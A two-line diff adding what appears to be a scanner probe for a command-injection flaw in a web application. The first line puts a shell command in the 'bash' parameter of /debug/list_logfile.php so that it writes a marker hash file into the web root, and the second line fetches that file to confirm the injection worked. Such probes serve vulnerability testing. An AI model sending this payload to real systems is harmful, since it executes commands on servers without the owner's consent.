@@ -1,0 +1,2 @@
+/debug/list_logfile.php?action=restartservice&bash=;echo 202cb962ac59075b964b07152d234b70 >/Isc/third-party/httpd/htdocs/test.txt;
+/test.txt
